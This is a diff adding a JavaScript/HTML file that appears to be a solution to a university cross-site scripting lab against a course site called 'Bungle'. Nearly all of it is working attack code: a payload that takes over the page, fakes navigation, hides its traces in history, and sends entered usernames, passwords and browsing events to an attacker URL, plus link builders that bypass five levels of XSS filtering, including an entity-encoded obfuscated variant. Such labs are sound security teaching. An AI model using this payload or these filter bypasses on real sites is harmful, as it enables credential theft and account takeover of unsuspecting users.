@@ -1,0 +1,111 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+function payload(attacker) {
+	function log(data) {
+		console.log($.param(data));
+		$.get(attacker, data);
+	}
+
+	function fakeButton(e, destination) {
+		e.preventDefault(); /* do not follow the link */
+		history.pushState(destination, "", destination); /* add a new history state */
+		proxy(destination); /* render the fake HTML */
+	}
+
+	/* Used for buttons that make a POST request */
+	function fakeButtonPOST(e, action) { 
+		e.preventDefault(); /* do not follow the link */
+		let destination = "./"; /* all buttons redirect to the front page */
+		if (action == "login" || action == "create") {
+			let user = $("#username").val();
+			let pw = $("#userpass").val();
+			$.post("./" + action, {username: user, password: pw}, function(data) {
+				log({event: "login", user: user, password: pw});
+				proxy(destination); /* render the fake HTML */
+			});
+		}
+		else { /* logout */
+			let user = $("#logged-in-user").text();
+			$.post("./logout", function(data) {
+				log({event: "logout", user: user});
+				if (window.location.pathname == "/search") { /* add a new history state only when logging out from the search page */
+					history.pushState(destination, "", destination);
+				}
+				proxy(destination); /* render the fake HTML */
+			});
+		}
+	}
+
+	function proxy(href) {
+		$("html").load(href, function(){
+			$("#bungle-lnk, #search-again-btn").click(function(e) { /* creating fake Bungle and Search Again buttons */
+				let destination = "./";
+				fakeButton(e, destination);
+			});
+
+			$("#search-btn").click(function(e) { /* creating a fake Search button */
+				let q = encodeURIComponent($("#query").val()); /* the query */
+				let destination = "./search?q=" + q;
+				fakeButton(e, destination);
+			});
+
+			$("#log-in-btn").click(function(e) { /* creating a fake Login button */
+				fakeButtonPOST(e, "login");
+			});
+
+			$("#new-account-btn").click(function(e) { /* creating a fake Create Account button */
+				fakeButtonPOST(e, "create");
+			});
+			
+			$("#log-out-btn").click(function(e) { /* creating a fake Logout button */
+				fakeButtonPOST(e, "logout");
+			});
+
+			$("a:contains(\"payload(\")").hide(); /* hide history items containing the term "payload(" */
+
+			let loggedUser = $("#logged-in-user").text(); /* will be empty if no user is logged in */
+			loggedUser ? log({event: "nav", uri: href, user: loggedUser}) : log({event: "nav", uri: href}); /* if not empty, log the username */
+			
+			$("html").show();
+		});
+	}
+
+	$("html").hide();
+	history.replaceState("./", "", "./");
+	window.onpopstate = function(e) { /* will fire when "back" or "forward" buttons are pressed in the browser */
+		proxy(e.state); 
+	};
+	proxy("./");
+}
+
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+	} 
+	if (xssdefense == 1) { /* s + script + cript */
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<sscriptcript" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</sscriptcript" + ">");
+	} 
+	if (xssdefense == 2) { /* load inside a body tag */
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<body onload='" + payload.toString() + ";payload(\"" + attacker + "\");'>");
+	}
+	if (xssdefense == 3) { /* svg tags are not filtered */
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<svg onload='" + payload.toString() + ";payload(\"" + attacker + "\");'>");
+	}
+	if (xssdefense == 4) { /* minify payload and encode using HTML entity codes */
+		let payload = "&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x20&#x6C&#x28&#x64&#x29&#x7B&#x24&#x2E&#x67&#x65&#x74&#x28&#x22&#x68&#x74&#x74&#x70&#x3A&#x2F&#x2F&#x31&#x32&#x37&#x2E&#x30&#x2E&#x30&#x2E&#x31&#x3A&#x33&#x31&#x33&#x33&#x37&#x2F&#x73&#x74&#x6F&#x6C&#x65&#x6E&#x22&#x2C&#x64&#x29&#x7D&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x20&#x79&#x28&#x65&#x2C&#x64&#x29&#x7B&#x65&#x2E&#x70&#x72&#x65&#x76&#x65&#x6E&#x74&#x44&#x65&#x66&#x61&#x75&#x6C&#x74&#x28&#x29&#x3B&#x62&#x2E&#x70&#x75&#x73&#x68&#x53&#x74&#x61&#x74&#x65&#x28&#x64&#x2C&#x22&#x22&#x2C&#x64&#x29&#x3B&#x70&#x28&#x64&#x29&#x7D&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x20&#x7A&#x28&#x65&#x2C&#x61&#x29&#x7B&#x65&#x2E&#x70&#x72&#x65&#x76&#x65&#x6E&#x74&#x44&#x65&#x66&#x61&#x75&#x6C&#x74&#x28&#x29&#x3B&#x64&#x3D&#x22&#x2F&#x22&#x3B&#x69&#x66&#x28&#x61&#x29&#x7B&#x75&#x3D&#x24&#x28&#x22&#x5B&#x69&#x64&#x24&#x3D&#x6D&#x65&#x5D&#x22&#x29&#x2E&#x76&#x61&#x6C&#x28&#x29&#x3B&#x74&#x3D&#x24&#x28&#x22&#x5B&#x69&#x64&#x24&#x3D&#x73&#x73&#x5D&#x22&#x29&#x2E&#x76&#x61&#x6C&#x28&#x29&#x3B&#x24&#x2E&#x70&#x6F&#x73&#x74&#x28&#x64&#x2B&#x61&#x2C&#x7B&#x75&#x73&#x65&#x72&#x6E&#x61&#x6D&#x65&#x3A&#x75&#x2C&#x70&#x61&#x73&#x73&#x77&#x6F&#x72&#x64&#x3A&#x74&#x7D&#x2C&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x29&#x7B&#x6C&#x28&#x7B&#x65&#x3A&#x22&#x6C&#x6F&#x67&#x69&#x6E&#x22&#x2C&#x75&#x73&#x65&#x72&#x3A&#x75&#x2C&#x70&#x77&#x3A&#x74&#x7D&#x29&#x3B&#x70&#x28&#x64&#x29&#x7D&#x29&#x7D&#x65&#x6C&#x73&#x65&#x7B&#x75&#x3D&#x24&#x28&#x22&#x5B&#x69&#x64&#x2A&#x3D&#x64&#x2D&#x5D&#x22&#x29&#x2E&#x74&#x65&#x78&#x74&#x28&#x29&#x3B&#x24&#x2E&#x70&#x6F&#x73&#x74&#x28&#x22&#x2F&#x6C&#x6F&#x67&#x6F&#x75&#x74&#x22&#x2C&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x29&#x7B&#x6C&#x28&#x7B&#x65&#x3A&#x22&#x6C&#x6F&#x67&#x6F&#x75&#x74&#x22&#x2C&#x75&#x73&#x65&#x72&#x3A&#x75&#x7D&#x29&#x3B&#x70&#x28&#x64&#x29&#x7D&#x29&#x7D&#x7D&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x20&#x70&#x28&#x68&#x29&#x7B&#x24&#x28&#x22&#x68&#x74&#x6D&#x6C&#x22&#x29&#x2E&#x6C&#x6F&#x61&#x64&#x28&#x68&#x2C&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x29&#x7B&#x24&#x28&#x22&#x23&#x62&#x75&#x6E&#x67&#x6C&#x65&#x2D&#x6C&#x6E&#x6B&#x2C&#x20&#x5B&#x69&#x64&#x2A&#x3D&#x61&#x67&#x5D&#x22&#x29&#x2E&#x63&#x6C&#x69&#x63&#x6B&#x28&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x65&#x29&#x7B&#x79&#x28&#x65&#x2C&#x22&#x2F&#x22&#x29&#x7D&#x29&#x3B&#x24&#x28&#x22&#x23&#x73&#x65&#x61&#x72&#x63&#x68&#x2D&#x62&#x74&#x6E&#x22&#x29&#x2E&#x63&#x6C&#x69&#x63&#x6B&#x28&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x65&#x29&#x7B&#x79&#x28&#x65&#x2C&#x22&#x2F&#x73&#x65&#x61&#x72&#x63&#x68&#x3F&#x71&#x3D&#x22&#x2B&#x24&#x28&#x22&#x23&#x71&#x75&#x65&#x72&#x79&#x22&#x29&#x2E&#x76&#x61&#x6C&#x28&#x29&#x29&#x7D&#x29&#x3B&#x24&#x28&#x22&#x23&#x6C&#x6F&#x67&#x2D&#x69&#x6E&#x2D&#x62&#x74&#x6E&#x22&#x29&#x2E&#x63&#x6C&#x69&#x63&#x6B&#x28&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x65&#x29&#x7B&#x7A&#x28&#x65&#x2C&#x22&#x6C&#x6F&#x67&#x69&#x6E&#x22&#x29&#x7D&#x29&#x3B&#x24&#x28&#x22&#x5B&#x69&#x64&#x5E&#x3D&#x6E&#x65&#x5D&#x22&#x29&#x2E&#x63&#x6C&#x69&#x63&#x6B&#x28&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x65&#x29&#x7B&#x7A&#x28&#x65&#x2C&#x22&#x63&#x72&#x65&#x61&#x74&#x65&#x22&#x29&#x7D&#x29&#x3B&#x24&#x28&#x22&#x23&#x6C&#x6F&#x67&#x2D&#x6F&#x75&#x74&#x2D&#x62&#x74&#x6E&#x22&#x29&#x2E&#x63&#x6C&#x69&#x63&#x6B&#x28&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x65&#x29&#x7B&#x7A&#x28&#x65&#x2C&#x22&#x22&#x29&#x7D&#x29&#x3B&#x24&#x28&#x22&#x61&#x3A&#x63&#x6F&#x6E&#x74&#x61&#x69&#x6E&#x73&#x28&#x5C&#x22&#x3C&#x5C&#x22&#x29&#x22&#x29&#x2E&#x68&#x69&#x64&#x65&#x28&#x29&#x3B&#x6C&#x28&#x7B&#x65&#x3A&#x22&#x6E&#x61&#x76&#x22&#x2C&#x75&#x72&#x69&#x3A&#x68&#x2C&#x75&#x73&#x65&#x72&#x3A&#x24&#x28&#x22&#x5B&#x69&#x64&#x2A&#x3D&#x64&#x2D&#x5D&#x22&#x29&#x2E&#x74&#x65&#x78&#x74&#x28&#x29&#x7D&#x29&#x3B&#x24&#x28&#x22&#x68&#x74&#x6D&#x6C&#x22&#x29&#x2E&#x73&#x68&#x6F&#x77&#x28&#x29&#x7D&#x29&#x7D&#x24&#x28&#x22&#x68&#x74&#x6D&#x6C&#x22&#x29&#x2E&#x68&#x69&#x64&#x65&#x28&#x29&#x3B&#x62&#x3D&#x68&#x69&#x73&#x74&#x6F&#x72&#x79&#x3B&#x62&#x2E&#x72&#x65&#x70&#x6C&#x61&#x63&#x65&#x53&#x74&#x61&#x74&#x65&#x28&#x22&#x2F&#x22&#x2C&#x22&#x22&#x2C&#x22&#x2F&#x22&#x29&#x3B&#x77&#x69&#x6E&#x64&#x6F&#x77&#x2E&#x6F&#x6E&#x70&#x6F&#x70&#x73&#x74&#x61&#x74&#x65&#x3D&#x66&#x75&#x6E&#x63&#x74&#x69&#x6F&#x6E&#x28&#x65&#x29&#x7B&#x70&#x28&#x65&#x2E&#x73&#x74&#x61&#x74&#x65&#x29&#x7D&#x3B&#x70&#x28&#x22&#x2F&#x22&#x29"
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<body onload=" + payload + ">");
+	}
+}
+
+var xssdefense = 4;
+var target = "http://trurl.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen"	;
+
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+</script>
+<h3></h3>
